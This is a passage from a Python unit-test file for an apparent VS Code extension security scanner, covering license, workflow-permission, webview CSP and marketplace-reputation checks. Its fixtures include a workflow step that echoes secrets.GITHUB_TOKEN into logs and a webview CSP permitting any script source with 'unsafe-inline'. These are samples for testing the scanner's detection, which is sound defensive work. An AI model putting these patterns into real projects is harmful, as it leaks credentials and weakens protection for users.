        self.assertIn("binary-without-origin", {finding.rule_id for finding in report.findings})

    def test_license_missing_is_posture_context_not_review(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"nolicense","version":"1.0.0"}',
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("license-missing", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertNotEqual(report.verdict, "malicious")
        self.assertNotEqual(report.verdict, "suspicious")

    def test_license_present_suppresses_license_missing_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"licensed","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "LICENSE").write_text("MIT", encoding="utf-8")

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("license-missing", rule_ids)

    def test_workflow_broad_token_permissions_is_posture_finding(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            workflows = root / ".github" / "workflows"
            workflows.mkdir(parents=True)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"broad-token","version":"1.0.0","repository":"https://github.com/example/broad-token"}',
                encoding="utf-8",
            )
            (workflows / "release.yml").write_text(
                "on: push\njobs:\n  release:\n    steps:\n      - run: echo ${{ secrets.GITHUB_TOKEN }}\n",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("workflow-token-permissions-broad", rule_ids)
        self.assertNotIn("dangerous-github-workflow", rule_ids)

    def test_webview_without_csp_meta_tag_is_low_hardening_evidence(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-nocsp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><body><script>doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("webview-csp-missing", rule_ids)
        self.assertEqual(report.malware_score, 0)
        self.assertEqual(report.verdict, "clean")
        self.assertEqual(report.severity, "LOW")

    def test_webview_with_unsafe_csp_directive_is_flagged(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-unsafe-csp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><head><meta http-equiv=\"Content-Security-Policy\" "
                "content=\"default-src \\'self\\'; script-src * \\'unsafe-inline\\'\"></head>"
                "<body><script>doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertIn("webview-csp-unsafe-directive", rule_ids)
        self.assertNotIn("webview-csp-missing", rule_ids)

    def test_webview_with_strict_csp_is_not_flagged(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            (root / "package.json").write_text(
                '{"publisher":"example","name":"webview-strict-csp","version":"1.0.0"}',
                encoding="utf-8",
            )
            (root / "extension.js").write_text(
                "function activate(context){"
                "const panel=vscode.window.createWebviewPanel('demo','Demo',1,{enableScripts:true});"
                "panel.webview.html='<html><head><meta http-equiv=\"Content-Security-Policy\" "
                "content=\"default-src \\'none\\'; script-src {{cspSource}} \\'nonce-abc123\\'\"></head>"
                "<body><script nonce=\"abc123\">doThing()</script></body></html>';"
                "}"
                "module.exports={activate};",
                encoding="utf-8",
            )

            report = scan_extension(root)

        rule_ids = {finding.rule_id for finding in report.findings}
        self.assertNotIn("webview-csp-missing", rule_ids)
        self.assertNotIn("webview-csp-unsafe-directive", rule_ids)

    def test_install_rating_mismatch_is_reputation_context_only(self) -> None:
        findings = _marketplace_metadata_findings("example.popular-bad-rating", {
            "extension_id": "example.popular-bad-rating",
            "found": True,
            "publisher_verified": True,
            "install_count": 200000,
            "rating_count": 50,
            "rating_average": 1.4,
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertIn("install-rating-mismatch", rule_ids)
        self.assertIn("marketplace-low-rating", rule_ids)
        mismatch = next(finding for finding in findings if finding["rule_id"] == "install-rating-mismatch")
        self.assertEqual(mismatch["category"], "reputation")

    def test_install_rating_mismatch_does_not_fire_for_low_install_low_rating(self) -> None:
        findings = _marketplace_metadata_findings("example.small-bad-rating", {
            "extension_id": "example.small-bad-rating",
            "found": True,
            "publisher_verified": True,
            "install_count": 50,
            "rating_count": 5,
            "rating_average": 1.4,
        })

        rule_ids = {finding["rule_id"] for finding in findings}
        self.assertNotIn("install-rating-mismatch", rule_ids)


if __name__ == "__main__":
    unittest.main()
